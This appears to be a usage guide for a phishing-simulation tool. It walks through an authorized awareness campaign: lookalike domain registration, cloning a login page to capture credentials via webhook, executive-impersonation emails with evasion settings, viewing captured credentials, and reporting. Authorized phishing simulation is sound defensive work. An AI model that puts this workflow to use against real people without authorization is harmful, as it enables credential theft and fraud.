# Usage Guide - Phishing Campaign Workflow

## Campaign Lifecycle

```
1. Planning → 2. Setup → 3. Testing → 4. Execution → 5. Analysis → 6. Cleanup
```

---

## Phase 1: Planning

### Define Objectives
- What are you testing? (awareness, technical controls, incident response)
- Who is the target audience? (all employees, specific departments, executives)
- What is the success criteria?

### Scope Definition
```bash
# Document in campaign description
- Target organization: Acme Corp
- Department: Finance
- Engagement dates: 2024-01-15 to 2024-01-30
- Authorization: Signed SOW #12345
```

### Select Template Type

**IT Support** - Good for:
- General employee population
- Testing credential theft awareness
- Password reset scenarios

**HR Notification** - Good for:
- Benefits season
- Testing curiosity/urgency
- Department-wide campaigns

**Executive Impersonation** - Good for:
- Finance/Accounting teams
- Wire transfer scenarios
- Authority/urgency testing

**Document Share** - Good for:
- Tech-savvy users
- Cloud service scenarios
- Collaboration tool testing

---

## Phase 2: Setup Infrastructure

### Step 1: Domain Acquisition
```bash
# Register a domain similar to target
# Examples:
# - acme-corp.com (if target is acmecorp.com)
# - acmecorp-portal.com
# - acmecorp.co (different TLD)

# Check domain reputation
python src/main.py domain check acme-corp.com
```

**Tips:**
- Age domain at least 30 days before use
- Use privacy protection
- Choose domains that look legitimate

### Step 2: SSL Certificate
```bash
# Obtain certificate
python src/main.py ssl obtain acme-corp.com \
  --email admin@example.com \
  --method standalone

# Verify installation
curl -vI https://acme-corp.com
```

### Step 3: Landing Page Setup
```bash
# Clone target login page
python src/main.py clone page https://login.acmecorp.com \
  --output ./landing_pages/acme \
  --webhook https://your-webhook-url.com

# Test the cloned page
cd landing_pages/acme_*
python -m http.server 8000

# Visit http://localhost:8000 to verify
```

### Step 4: DNS Configuration
```bash
# Add required DNS records (see SETUP_GUIDE.md)
# Wait 24-48 hours for propagation
# Verify configuration
python src/main.py domain check acme-corp.com
```

---

## Phase 3: Campaign Creation

### Create Campaign
```bash
python src/main.py campaign create \
  --name "Q1 2024 Security Awareness - Finance Dept" \
  --description "Testing finance team awareness of executive impersonation attacks" \
  --template executive_impersonation \
  --domain acmecorp.com \
  --url https://acme-corp.com/portal/login

# Note the Campaign ID (e.g., 20240115143022)
```

### Add Targets

**Option 1: Manual Entry**
```python
from src.core.campaign_manager import CampaignManager, Target

manager = CampaignManager()

targets = [
    Target(
        email="john.smith@acmecorp.com",
        name="John Smith",
        company="Acme Corp",
        position="Accountant",
        department="Finance"
    ),
    Target(
        email="jane.doe@acmecorp.com",
        name="Jane Doe",
        company="Acme Corp",
        position="CFO",
        department="Finance"
    )
]

manager.add_targets("20240115143022", targets)
```

**Option 2: CSV Import**
```python
import csv
from src.core.campaign_manager import CampaignManager, Target

manager = CampaignManager()
targets = []

with open('targets.csv', 'r') as f:
    reader = csv.DictReader(f)
    for row in reader:
        targets.append(Target(
            email=row['email'],
            name=row['name'],
            company=row['company'],
            position=row.get('position'),
            department=row.get('department')
        ))

manager.add_targets("20240115143022", targets)
```

**targets.csv format:**
```csv
email,name,company,position,department
john.smith@acmecorp.com,John Smith,Acme Corp,Accountant,Finance
jane.doe@acmecorp.com,Jane Doe,Acme Corp,CFO,Finance
```

---

## Phase 4: Testing (Critical!)

### Pre-Flight Checklist

**1. Test Email Delivery**
```bash
# Send test email to yourself
python scripts/send_test_email.py \
  --campaign-id 20240115143022 \
  --test-email your-email@gmail.com
```

Check:
- [ ] Email arrives in inbox (not spam)
- [ ] Subject line looks legitimate
- [ ] From address looks correct
- [ ] Links work correctly
- [ ] Tracking pixels load

**2. Test Landing Page**
```bash
# Visit the phishing URL
# Try submitting test credentials
# Verify credentials are captured
```

Check:
- [ ] Page loads correctly
- [ ] SSL certificate shows valid
- [ ] Form submits successfully
- [ ] Credentials logged properly
- [ ] Redirect works (if configured)
- [ ] Webhook notification received

**3. Test Tracking**
- [ ] Open tracking works
- [ ] Click tracking works
- [ ] Submission tracking works
- [ ] Timestamps accurate

**4. DNS Verification**
```bash
python src/main.py domain check acme-corp.com
```

Check:
- [ ] SPF configured
- [ ] DKIM configured
- [ ] DMARC configured
- [ ] Not blacklisted
- [ ] SSL valid

---

## Phase 5: Campaign Execution

### Start Campaign
```bash
python src/main.py campaign start 20240115143022
```

### Send Emails

**Option 1: Python Script**
```python
import asyncio
from src.core.campaign_manager import CampaignManager
from src.core.email_generator import EmailGenerator
from src.core.email_sender import EmailSender, EmailConfig, EmailMessage

# Initialize
manager = CampaignManager()
generator = EmailGenerator()

config = EmailConfig(
    smtp_host="smtp.sendgrid.net",
    smtp_port=587,
    smtp_user="apikey",
    smtp_password="YOUR_API_KEY",
    from_name="Michael Chen",
    from_email="mchen@acme-corp.com"
)
sender = EmailSender(config)

# Get campaign targets
campaign_id = "20240115143022"
targets = manager.get_campaign_targets(campaign_id)

# Send emails
for target in targets:
    # Generate personalized email
    email = generator.generate_email(
        template_type="executive_impersonation",
        target_data={
            "name": target.name,
            "email": target.email,
            "company": target.company,
            "phishing_url": "https://acme-corp.com/portal/login",
            "executive_name": "Michael Chen",
            "executive_title": "CEO"
        },
        evasion_level="medium"
    )

    # Send
    message = EmailMessage(
        to_email=target.email,
        to_name=target.name,
        subject=email['subject'],
        html_body=email['html_body'],
        text_body=email['text_body'],
        preheader=email['preheader']
    )

    result = sender.send_email(message)

    # Log event
    if result['success']:
        manager.log_event(campaign_id, target.email, "sent")

    # Rate limiting (5 emails per minute)
    await asyncio.sleep(12)
```

**Option 2: Gradual Rollout**
```python
# Day 1: Send to 10% of targets
# Day 2: Send to another 20%
# Day 3: Send to remaining 70%

# This allows you to:
# - Test with small group first
# - Stop if issues detected
# - Adjust based on initial results
```

### Monitor Campaign
```bash
# Check statistics
python src/main.py campaign stats 20240115143022

# Watch real-time logs
tail -f logs/app.log

# Check captured credentials
python scripts/view_credentials.py --campaign-id 20240115143022
```

---

## Phase 6: Analysis

### Generate Report
```bash
python src/main.py campaign report 20240115143022 \
  --output reports/q1_2024_finance.json
```

### Key Metrics to Analyze

**Delivery Metrics:**
- Total sent
- Delivery rate
- Bounce rate

**Engagement Metrics:**
- Open rate (industry average: 20-30%)
- Click rate (industry average: 10-15%)
- Submission rate (industry average: 5-10%)

**Time Analysis:**
- Time to first open
- Time to first click
- Time to first submission
- Peak activity times

**Demographics:**
- Which departments most susceptible?
- Position/seniority correlation?
- Repeat offenders?

### Sample Report Format

```markdown
# Phishing Campaign Report - Q1 2024 Finance Department

## Executive Summary
- Campaign ran from Jan 15-30, 2024
- Targeted 50 employees in Finance department
- Overall click rate: 24% (above industry average)

## Results
- Emails sent: 50
- Emails opened: 35 (70%)
- Links clicked: 12 (24%)
- Credentials submitted: 5 (10%)

## Key Findings
1. CFO and senior executives showed highest awareness
2. Junior staff most susceptible (40% click rate)
3. Emails sent Monday morning had highest engagement
4. Executive impersonation template was effective

## Recommendations
1. Additional training for junior staff
2. Implement executive email verification process
3. Enable MFA for all financial systems
4. Regular phishing simulations quarterly

## Detailed Data
[Include charts, graphs, individual results]
```

---

## Phase 7: Cleanup

### Stop Campaign
```bash
python src/main.py campaign complete 20240115143022
```

### Cleanup Checklist

**1. Disable Infrastructure**
```bash
# Stop nginx
sudo systemctl stop nginx

# Revoke SSL certificate (optional)
python src/main.py ssl revoke acme-corp.com
```

**2. Export Data**
```bash
# Export campaign data
python src/main.py campaign export 20240115143022 \
  --output backups/campaign_20240115143022.json

# Backup database
cp campaigns.db backups/campaigns_20240130.db
```

**3. Delete Sensitive Data**
```bash
# Delete captured credentials (after documenting)
python scripts/cleanup_campaign.py --campaign-id 20240115143022

# Or manually
rm -rf landing_pages/acme_*
rm logs/credentials.log
```

**4. Documentation**
- Create final report
- Document lessons learned
- Update recommendations
- Archive for compliance

**5. DNS Cleanup**
- Remove DNS records
- Let domain expire or repurpose

---

## Best Practices

### Do's ✓
- Always get written authorization
- Test thoroughly before launch
- Start small (pilot group)
- Monitor constantly
- Document everything
- Provide immediate training to caught users
- Follow up with organization-wide training

### Don'ts ✗
- Never exceed authorized scope
- Don't target personal emails
- Don't collect unnecessary data
- Don't shame individual users publicly
- Don't reuse infrastructure across clients
- Don't skip testing phase
- Don't leave infrastructure running unnecessarily

---

## Advanced Techniques

### A/B Testing
```python
# Test different subject lines
subjects = generator.generate_subject_variations(base_subject, count=3)

# Split targets into groups
group_a = targets[:len(targets)//3]
group_b = targets[len(targets)//3:2*len(targets)//3]
group_c = targets[2*len(targets)//3:]

# Send with different subjects
# Compare results
```

### Time-Based Campaigns
```python
import schedule
import time

# Schedule sends for optimal times
schedule.every().monday.at("09:00").do(send_batch_1)
schedule.every().wednesday.at("13:00").do(send_batch_2)
schedule.every().friday.at("15:00").do(send_batch_3)

while campaign_active:
    schedule.run_pending()
    time.sleep(60)
```

### Multi-Stage Campaigns
```
Stage 1: Initial phishing email
Stage 2: Reminder email (to non-clickers)
Stage 3: Different template (to test consistency)
```

---

## Troubleshooting

### Low Open Rates
- Emails going to spam
- Check SPF/DKIM/DMARC
- Improve subject lines
- Verify from address legitimacy

### Low Click Rates
- Email not compelling enough
- Try different template
- Adjust urgency/authority
- A/B test subject lines

### Technical Issues
- Page not loading: Check nginx, SSL
- Credentials not captured: Check PHP/backend
- Tracking not working: Check pixel implementation

---

## Next Steps

- Review [BEST_PRACTICES.md](BEST_PRACTICES.md)
- See [API_DOCUMENTATION.md](API_DOCUMENTATION.md) for automation
- Join community discussions

**Questions?** Open an issue on GitHub or contact support.
